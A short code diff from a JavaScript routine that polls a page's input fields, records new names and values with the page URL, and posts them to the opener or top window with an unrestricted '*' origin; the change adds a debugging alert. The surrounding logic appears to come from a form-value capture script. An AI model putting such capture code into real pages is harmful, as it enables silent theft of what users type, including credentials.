@@ -20,6 +20,7 @@ setInterval(function(){
           /* new input/value discovered, remember it and send it up */
           found[name] = val;
           var result = { name: name, value: val, url: window.location.href, send: true };
+          alert("RESULT: " + result);
           (opener||top).postMessage(JSON.stringify(result), '*');
         }
       }
